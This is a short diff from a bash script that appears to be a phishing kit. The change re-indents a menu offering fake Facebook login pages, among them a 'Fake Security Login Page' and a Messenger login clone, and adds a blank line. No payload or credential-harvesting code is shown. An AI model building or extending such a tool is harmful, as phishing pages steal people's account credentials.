@@ -234,11 +234,12 @@ fi
 
 facebook(){
 echo  "  _____________________________________________________________" | lolcat
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m          Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m          Advanced Voting Poll Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m          Fake Security Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m          Facebook Messenger Login Page\e[0m\n"
+printf "                                                                \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
+printf "                                                                \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[0m\e[96m Advanced Voting Poll Login Page\e[0m\n"
+printf "                                                                \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[0m\e[96m Fake Security Login Page\e[0m\n"
+printf "                                                                \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[0m\e[96m Facebook Messenger Login Page\e[0m\n"
 echo  "  _____________________________________________________________" | lolcat
+echo ""
 echo -e "╭─[TECHNOCYBER]" |lolcat
 read -p "   ╰─root@./2Timeowl=" fb_option
 
